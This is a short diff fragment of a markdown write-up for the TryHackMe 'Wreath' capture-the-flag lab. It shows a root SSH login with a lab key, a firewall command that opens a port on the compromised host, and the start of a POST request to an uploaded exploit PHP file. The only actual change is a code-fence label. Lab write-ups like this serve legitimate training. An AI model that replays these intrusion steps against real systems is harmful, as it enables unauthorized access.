@@ -151,7 +151,7 @@ $ ssh -i TryHackMe/Wreath/Task6/id_rsa root@10.200.100.200
 [root@prod-serv ~]# firewall-cmd --zone=public --add-port 47000/tc
 ```
 
-```
+```http
 POST /web/exploit-AppleGamer22.php HTTP/1.1
 Host: 10.200.100.150
 Upgrade-Insecure-Requests: 1
